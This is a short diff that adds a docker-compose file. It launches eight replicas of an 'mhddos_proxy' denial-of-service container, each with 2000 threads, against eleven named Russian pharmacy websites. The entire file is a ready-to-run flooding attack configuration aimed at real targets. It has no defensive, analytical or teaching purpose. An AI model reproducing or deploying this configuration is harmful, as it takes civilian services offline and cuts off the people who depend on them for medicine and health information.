@@ -1,0 +1,9 @@
+version: '3'
+
+services:
+
+  bomb01:
+    image: portholeascend/mhddos_proxy:latest
+    command: https://www.eapteka.ru   https://www.asna.ru/   https://366.ru   https://stolichki.ru   https://aptekamos.ru   https://vseapteki.ru   https://www.rigla.ru   https://planetazdorovo.ru   https://samson-pharma.ru   https://zdorov.ru   https://apteka.ru -t 2000 --debug
+    deploy:
+      replicas: 8
